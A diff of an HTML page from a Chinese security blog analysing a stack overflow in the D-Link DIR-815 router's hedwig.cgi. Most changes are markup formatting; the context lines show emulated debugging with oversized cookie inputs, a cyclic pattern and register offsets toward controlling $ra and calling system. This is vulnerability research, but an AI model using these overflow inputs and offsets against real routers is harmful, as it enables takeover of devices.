@@ -4,10 +4,10 @@
 
 
 <html class="theme-next muse" lang="zh-Hans">
-<head>
-  <meta charset="UTF-8"/>
-<meta http-equiv="X-UA-Compatible" content="IE=edge" />
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="theme-color" content="#222">
 
 
@@ -18,8 +18,8 @@
 
 
 
-<meta http-equiv="Cache-Control" content="no-transform" />
-<meta http-equiv="Cache-Control" content="no-siteapp" />
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
 
 
 
@@ -38,7 +38,7 @@
 
   
   
-  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
 
 
 
@@ -46,9 +46,9 @@
 
 
 
-<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
 
-<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css" />
+<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css">
 
 
   <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png?v=5.1.3">
@@ -66,13 +66,13 @@
 
 
 
-  <meta name="keywords" content="漏洞分析,路由漏洞,溢出漏洞,分析笔记," />
+  <meta name="keywords" content="漏洞分析,路由漏洞,溢出漏洞,分析笔记,">
 
 
 
 
 
-  <link rel="alternate" href="/atom.xml" title="giantbranch's blog" type="application/atom+xml" />
+  <link rel="alternate" href="/atom.xml" title="giantbranch's blog" type="application/atom+xml">
 
 
 
@@ -135,7 +135,7 @@
 
 
 
-  <link rel="canonical" href="https://www.giantbranch.cn/2018/05/02/D-Link_DIR-815_路由器多次溢出分析/"/>
+  <link rel="canonical" href="https://www.giantbranch.cn/2018/05/02/D-Link_DIR-815_路由器多次溢出分析/">
 
 
 
@@ -188,7 +188,7 @@
     
 
     <div class="custom-logo-site-title">
-      <a href="/"  class="brand" rel="start">
+      <a href="/" class="brand" rel="start">
         <span class="logo-line-before"><i></i></span>
         <span class="site-title">giantbranch's blog</span>
         <span class="logo-line-after"><i></i></span>
@@ -218,7 +218,7 @@
         <li class="menu-item menu-item-home">
           <a href="/" rel="section">
             
-              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
             
             首页
           </a>
@@ -228,7 +228,7 @@
         <li class="menu-item menu-item-about">
           <a href="/about/" rel="section">
             
-              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
             
             关于
           </a>
@@ -238,7 +238,7 @@
         <li class="menu-item menu-item-tags">
           <a href="/tags/" rel="section">
             
-              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
             
             标签
           </a>
@@ -248,7 +248,7 @@
         <li class="menu-item menu-item-archives">
           <a href="/archives/" rel="section">
             
-              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
             
             归档
           </a>
@@ -258,7 +258,7 @@
         <li class="menu-item menu-item-vulfound">
           <a href="/vulfound/" rel="section">
             
-              <i class="menu-item-icon fa fa-fw fa-calendar"></i> <br />
+              <i class="menu-item-icon fa fa-fw fa-calendar"></i> <br>
             
             漏洞挖掘
           </a>
@@ -268,7 +268,7 @@
         <li class="menu-item menu-item-book">
           <a href="/book/" rel="section">
             
-              <i class="menu-item-icon fa fa-fw fa-book"></i> <br />
+              <i class="menu-item-icon fa fa-fw fa-book"></i> <br>
             
             读过的书
           </a>
@@ -278,7 +278,7 @@
         <li class="menu-item menu-item-sitemap">
           <a href="/sitemap.xml" rel="section">
             
-              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br />
+              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>
             
             站点地图
           </a>
@@ -321,7 +321,7 @@
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="giantbranch">
-      <meta itemprop="description" content="">
+      <meta itemprop="description" content>
       <meta itemprop="image" content="/images/avatar.gif">
     </span>
 
@@ -366,8 +366,7 @@
                   <i class="fa fa-comment-o"></i>
                 </span>
                 <a href="/2018/05/02/D-Link_DIR-815_路由器多次溢出分析/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count disqus-comment-count"
-                        data-disqus-identifier="2018/05/02/D-Link_DIR-815_路由器多次溢出分析/" itemprop="commentCount"></span>
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2018/05/02/D-Link_DIR-815_路由器多次溢出分析/" itemprop="commentCount"></span>
                 </a>
               </span>
             
@@ -404,16 +403,16 @@
 <p>这是一个mips 32位小端的程序（MSB大端，LSB小端）</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">giant@ubuntu:~/learn/ch10/_DIR-815_FW_1.01b14_1.01b14.bin.extracted/squashfs-root/htdocs/web$ file ../cgibin </div><div class="line">../cgibin: ELF 32-bit LSB executable, MIPS, MIPS32 version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped</div></pre></td></tr></table></figure>
 <p>用ida打开cgibin，就是判断你访问的是哪个cgi，接着去对应的函数处理</p>
-<p><img src="http://pic.giantbranch.cn/pic/1525317516621.jpg" alt=""></p>
+<p><img src="http://pic.giantbranch.cn/pic/1525317516621.jpg" alt></p>
 <p>我们找到hedwig.cgi的处理函数为hedwigcgi_main，函数只处理post请求，接着读取/etc/config/image_sign获取固件的sign（其实就是路由的型号），后面就是构造xml的操作，只看外层没看到处理cookie的函数</p>
 <p>第二个方法就是字符串搜索cookie，有个HTTP_COOKIE的字符串（因为CGI编程可以通过getenv(“HTTP_COOKIE”)来获得cookie，所以有编程基础还是很重要的），解引用是在sess_get_uid函数里面，而且hedwigcgi_main调用了这个函数</p>
-<p><img src="http://pic.giantbranch.cn/pic/1525318300728.jpg" alt=""></p>
+<p><img src="http://pic.giantbranch.cn/pic/1525318300728.jpg" alt></p>
 <p>而且根据这个函数名和里面的逻辑，我们的cookie应该是uid=xxx的形式</p>
-<p><img src="http://pic.giantbranch.cn/pic/1525318502267.jpg" alt=""></p>
+<p><img src="http://pic.giantbranch.cn/pic/1525318502267.jpg" alt></p>
 <p>而而且hedwigcgi_main函数获取到cookie后的sprintf很可能是造成溢出的函数</p>
-<p><img src="http://pic.giantbranch.cn/pic/1525318538510.jpg" alt=""></p>
+<p><img src="http://pic.giantbranch.cn/pic/1525318538510.jpg" alt></p>
 <p>其实下面还有个sprintf函数，说不定是那个函数，这可能要取决于真正的路由器上有没有/var/tmp/这个目录（当然这里实际的路由器是有的）</p>
-<p><img src="http://pic.giantbranch.cn/pic/1525397927934.jpg" alt=""></p>
+<p><img src="http://pic.giantbranch.cn/pic/1525397927934.jpg" alt></p>
 <h1 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h1><p>最重要有一点是没讲的，复制库到当前的目录，先查看需要哪些</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">giant@ubuntu:~/learn/ch10/_DIR-815_FW_1.01b14_1.01b14.bin.extracted/squashfs-root$ cp $(which qemu-mipsel) ./qemu-mipsel</div><div class="line">giant@ubuntu:~/learn/ch10/_DIR-815_FW_1.01b14_1.01b14.bin.extracted/squashfs-root$ ldd ./qemu-mipsel </div><div class="line">	linux-vdso.so.1 =&gt;  (0x00007ffcbef94000)</div><div class="line">	libgmodule-2.0.so.0 =&gt; /usr/lib/x86_64-linux-gnu/libgmodule-2.0.so.0 (0x00007fe77af4e000)</div><div class="line">	libglib-2.0.so.0 =&gt; /lib/x86_64-linux-gnu/libglib-2.0.so.0 (0x00007fe77ac3a000)</div><div class="line">	librt.so.1 =&gt; /lib/x86_64-linux-gnu/librt.so.1 (0x00007fe77aa32000)</div><div class="line">	libm.so.6 =&gt; /lib/x86_64-linux-gnu/libm.so.6 (0x00007fe77a6dc000)</div><div class="line">	libgcc_s.so.1 =&gt; /lib/x86_64-linux-gnu/libgcc_s.so.1 (0x00007fe77a4c5000)</div><div class="line">	libpthread.so.0 =&gt; /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007fe77a2a6000)</div><div class="line">	libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007fe779ec6000)</div><div class="line">	libdl.so.2 =&gt; /lib/x86_64-linux-gnu/libdl.so.2 (0x00007fe779cc2000)</div><div class="line">	libpcre.so.3 =&gt; /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007fe779a50000)</div><div class="line">	/lib64/ld-linux-x86-64.so.2 (0x00007fe77d5b4000)</div></pre></td></tr></table></figure>
 <p>正式复制</p>
@@ -421,21 +420,21 @@
 <p>启动并传递环境变量等待调试</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">giant@ubuntu:~/learn/ch10/_DIR-815_FW_1.01b14_1.01b14.bin.extracted/squashfs-root$ sudo chroot ./ ./qemu-mipsel -E CONTENT_LENGTH=20 -E CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot; -E REQUEST_METHOD=&quot;POST&quot; -E HTTP_COOKIE=`python -c &quot;print &apos;uid=123&apos;+&apos;A&apos;*0x600&quot;` -E REQUEST_URI=&quot;/hedwig.cgi&quot; -E REMOTE_ADDR=&quot;192.168.1.1&quot; -g 23946 ./htdocs/web/hedwig.cgi</div></pre></td></tr></table></figure>
 <p>打开ida远程attach上去，可以看到执行完sobj_get_string后，v0的值已经指向uid的值了</p>
-<p><img src="http://pic.giantbranch.cn/pic/1525336810722.jpg" alt=""></p>
+<p><img src="http://pic.giantbranch.cn/pic/1525336810722.jpg" alt></p>
 <p><strong>上图中的s5的注释写错了</strong>，s5为sobj_new的返回值覆盖，而且s5并不是sprintf的第一个参数，他是sobj_get_string的第一个参数，因为mips的流水线执行，先执行了jalr后面的一条，再执行jalr</p>
-<p><img src="http://pic.giantbranch.cn/pic/1525338907272.jpg" alt=""></p>
+<p><img src="http://pic.giantbranch.cn/pic/1525338907272.jpg" alt></p>
 <p>真正的参数1是s1</p>
-<p><img src="http://pic.giantbranch.cn/pic/1525344621510.jpg" alt=""></p>
+<p><img src="http://pic.giantbranch.cn/pic/1525344621510.jpg" alt></p>
 <p>我们跟随s1，可以看到已经格式化好了，且覆盖的是栈上的地址</p>
-<p><img src="http://pic.giantbranch.cn/pic/1525344684584.jpg" alt=""></p>
+<p><img src="http://pic.giantbranch.cn/pic/1525344684584.jpg" alt></p>
 <p>我们先看看假如没有创建/var/tmp/的时候的情况，那肯定会跳到这边来</p>
-<p><img src="http://pic.giantbranch.cn/pic/1525414115077.jpg" alt=""></p>
+<p><img src="http://pic.giantbranch.cn/pic/1525414115077.jpg" alt></p>
 <p>最后返回的时候从栈上取值，就把$ra给覆盖了</p>
-<p><img src="http://pic.giantbranch.cn/pic/1525414319196.jpg" alt=""></p>
-<p><img src="http://pic.giantbranch.cn/pic/1525414396338.jpg" alt=""></p>
+<p><img src="http://pic.giantbranch.cn/pic/1525414319196.jpg" alt></p>
+<p><img src="http://pic.giantbranch.cn/pic/1525414396338.jpg" alt></p>
 <p>而实际的路由中是存在/var/tmp/目录的，所以上面这条路径是有问题的，我们建立这个目录，重新调试</p>
 <p>由于xml里面没有数据，最终还是不能执行到那</p>
-<p><img src="http://pic.giantbranch.cn/pic/1525663382508.jpg" alt=""></p>
+<p><img src="http://pic.giantbranch.cn/pic/1525663382508.jpg" alt></p>
 <p>那我们随便写点东西到temp.xml里面</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&lt;note&gt;</div><div class="line">        &lt;to&gt;George&lt;/to&gt;</div><div class="line">        &lt;from&gt;John&lt;/from&gt;</div><div class="line">        &lt;heading&gt;Reminder&lt;/heading&gt;</div><div class="line">        &lt;body&gt;Don&apos;t forget the meeting!&lt;/body&gt;</div><div class="line">&lt;/note&gt;</div></pre></td></tr></table></figure>
 <p>但由于下面的haystack还是0，所以最终还是进入不了那个分支，不知作者当时是怎么搞的</p>
@@ -444,7 +443,7 @@
 <p>先用gef生成2000个测试字符并准备调试</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo chroot ./ ./qemu-mipsel -E CONTENT_LENGTH=20 -E CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot; -E REQUEST_METHOD=&quot;POST&quot; -E HTTP_COOKIE=`python -c &quot;print &apos;uid=AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6AsLAshAs7AsMAsiAs8AsNAsjAs9AsOAskAsPAslAsQAsmAsRAsoAsSAspAsTAsqAsUAsrAsVAstAsWAsuAsXAsvAsYAswAsZAsxAs&apos;&quot;` -E REQUEST_URI=&quot;/hedwig.cgi&quot; -E REMOTE_ADDR=&quot;192.168.1.1&quot; -g 23946 ./htdocs/web/hedwig.cgi</div></pre></td></tr></table></figure>
 <p>调试结果</p>
-<p><img src="http://pic.giantbranch.cn/pic/1525677813304.jpg" alt=""></p>
+<p><img src="http://pic.giantbranch.cn/pic/1525677813304.jpg" alt></p>
 <p>s0偏移1007， ra偏移1043</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">gef?  pattern offset 0x6161636B</div><div class="line">[+] Searching &apos;0x6161636B&apos;</div><div class="line">[+] Found at offset 1007 (little-endian search) likely</div><div class="line">[+] Found at offset 237 (big-endian search) </div><div class="line"></div><div class="line">gef➤  pattern offset 0x61616C6B</div><div class="line">[+] Searching &apos;0x61616C6B&apos;</div><div class="line">[+] Found at offset 1043 (little-endian search) likely</div><div class="line">[+] Found at offset 1137 (big-endian search)</div></pre></td></tr></table></figure>
 <p>由于路由应该没有开启aslr，所以用的基址+偏移的形式调用system</p>
@@ -471,14 +470,14 @@
 
     
       <div id="wechat" style="display: inline-block">
-        <img id="wechat_qr" src="http://paypic.giantbranch.cn/wechat.png" alt="giantbranch 微信支付"/>
+        <img id="wechat_qr" src="http://paypic.giantbranch.cn/wechat.png" alt="giantbranch 微信支付">
         <p>微信支付</p>
       </div>
     
 
     
       <div id="alipay" style="display: inline-block">
-        <img id="alipay_qr" src="http://paypic.giantbranch.cn/alipay.png" alt="giantbranch 支付宝"/>
+        <img id="alipay_qr" src="http://paypic.giantbranch.cn/alipay.png" alt="giantbranch 支付宝">
         <p>支付宝</p>
       </div>
     
